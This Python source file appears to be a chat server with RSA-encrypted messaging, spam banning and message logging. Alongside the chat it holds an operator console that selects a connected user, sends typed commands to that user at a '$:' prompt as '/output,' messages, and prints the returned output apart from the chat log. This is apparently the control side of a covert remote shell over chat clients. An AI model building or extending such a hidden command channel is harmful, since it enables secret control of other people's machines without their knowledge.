import socket
from termcolor import colored
from threading import Thread
from time import sleep
import rsa

SECONDS_RANGE = 5
MAX_MESSAGES_PER_SECOND = 1   # 5 messages in SECONDS_RANGE seconds

# Just to be able do decrement the variable in another Thread
class Msg:
    num_msg_sent = 0
    stop_thread = False

def target_handler():

    while True:
        cmd = input("\n$: ")

        if len(cmd) == 0:
            continue 

        if cmd == "ls":
            for i in range(len(clients)):
                client = clients[i]
                print(f"{i}. {client['nickname']} - {client['addr'][0]}:{client['addr'][1]}")
        
        elif cmd.startswith("select "):
            try:
                user_num = int(cmd.split(" ")[1])
                if user_num >= len(clients):
                    print("This user does not exists")
                    continue
            except ValueError:
                print("Invalid selection")
                continue

            target = clients[user_num]

            while cmd != "exit":
                sleep(0.5)
                cmd = input(f"\r{target['nickname']} $: ")
                if cmd == "exit":
                    break
                cmd = "/output," + cmd
                try:
                    send_message(cmd, target)
                except OSError:
                    cmd = "exit"

        elif cmd == "help":
            print("\t\t\t Print connected users \r ls -")
            print("\t\t\t Select user number n \r select <n> -")
            print("\t\t\t Send message to user u \r send <msg> <u> -")
            print("\t\t\t Print this guide \r help -")

        elif cmd.startswith("send "):

            msg = " ".join( cmd.split(" ")[1:-1] )

            try:
                user = cmd.split(" ")[-1]

                if user == "*":
                    broadcast_clients("admin", msg)
                    continue
                
                user_num = int(user)

                if user_num >= len(clients):
                    print("This user does not exists")
                    continue

                target = clients[user_num]

            except ValueError:
                target, i = None, 0

                for client in clients:
                    if client["nickname"] == user:
                        target = clients[i]
                        break
                    i += 1

                if target == None:
                    print("Invalid selection")
                    continue
            
            send_message("admin," + msg, target)

# Send message to specified client
def send_message(data, client):
    client["conn"].sendall( rsa.encrypt(data.encode(), client["key"]) )

def handle_connection(client : dict, conn : socket.socket = None):
    conn = client["conn"]
    addr = client["addr"]
    conn.settimeout(None)
    msg = Msg()             # todo make num_msg_sent part of client's dictionary

    global private_key, RSA_KEY_LEN
    nickname = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key).decode('utf-8', errors='ignore')

    if not is_nickname_valid(nickname):
        send_message("/invalid_nickname", client)
        remove_client(client)
        conn.close()
        return

    send_message("/ok", client)

    users.append(nickname)
    client["nickname"] = nickname
    broadcast_clients("/new_user", nickname)

    x = Thread(target=decrement_num_msg_sent, args=[msg])
    x.start()
    
    try:
        with conn:
            print(colored(f'[+] {addr} - {nickname} connected', "green"))
            # Wait for messages
            while True:
                data = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key).decode('utf-8', errors='ignore')    # 128 max bytes decryptable with 1024 rsa key
                if not data: continue

                if data.startswith("/output,"):
                    print(data[8:], end="")
                    continue

                msg.num_msg_sent += 1

                # Check for number of messages sent within SECONDS_RANGE seconds
                if is_spam(msg.num_msg_sent):
                    banned_ips.append(str(addr[0]))
                    broadcast_clients("/ban", nickname)
                    print(colored(f"=> {addr} - {nickname} banned.", "red", attrs=["bold"]))
                    raise Exception()
                
                with open("msg.txt", "a") as log_file:
                    log_file.write(f"{nickname}: \t{data}\n")
                
                # send message to all clients. All clients will print their own sent messages by themselves
                broadcast_clients(nickname, data, [client])
    except Exception as e:
        pass
    
    msg.stop_thread = True
    remove_client(client)
    conn.close()
    broadcast_clients("/user_left", nickname, [conn])
    print(colored(f'[-] {addr} - {nickname} disconnected', "red"))
    return

def is_nickname_valid(nick : str):
    return not(
        nick.strip() == "" or 
        nick == None or 
        nick.startswith("/") or
        nick.strip() == "admin"
    )

def is_spam(num_msg_sent):
    return (num_msg_sent / SECONDS_RANGE) > MAX_MESSAGES_PER_SECOND

def decrement_num_msg_sent(msg):
    while not msg.stop_thread:
        sleep(SECONDS_RANGE)
        if msg.num_msg_sent > 0:
            msg.num_msg_sent -= 1
        
# exceptions: clients that don't need to receive the message 
def broadcast_clients(nickname, data, exceptions=[]):
    for client in clients:
        if(client in exceptions): continue

        _data = nickname + "," + data
        client["conn"].sendall( rsa.encrypt(_data.encode(), client["key"]) )
    return

def remove_client(client : dict):
    try:
        nick = client["nickname"]
        clients.remove(client)
        users.remove(nick)
    except:
        pass

def exchange_keys(conn : socket.socket):
    global public_key, clients

    conn.sendall( public_key.save_pkcs1() )
    client_key = rsa.PublicKey.load_pkcs1( conn.recv(1024) )
    
    client = {
        "conn": conn,
        "addr": None,
        "nickname": "",     # nickname is defined in handle_connection()
        "key": client_key
    }

    clients.append(client)


def main():
    HOST = ''                 # all available interfaces
    PORT = 58465              # Arbitrary port

    global clients
    global users
    clients = []                # array of dictionaries
    users = []

    global banned_ips
    banned_ips = []

    global RSA_KEY_LEN
    RSA_KEY_LEN = 1024

    global public_key, private_key
    public_key, private_key = rsa.newkeys(RSA_KEY_LEN)


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        print(colored("=> Server started", "green"))
        try:
            target_thread = Thread(target=target_handler)
            target_thread.start()
            while True:
                s.listen(1)
                conn, addr = s.accept()

                conn.sendall( public_key.save_pkcs1() )

                if str(addr[0]) in banned_ips:
                    conn.sendall( rsa.encrypt(b"/ban", public_key) )
                    conn.close()
                    continue

                
                exchange_keys(conn)
                client = clients[-1]
                client["addr"] = addr
                data = "/new_user," + ",".join(users)
                conn.sendall( rsa.encrypt(data.encode(), client["key"]) )

                Thread(target=handle_connection, args=(client,)).start()
        
        except KeyboardInterrupt:
            print(colored("=> Server stopped", "red"))
        
        exit(0)


if __name__ == '__main__':
    main()
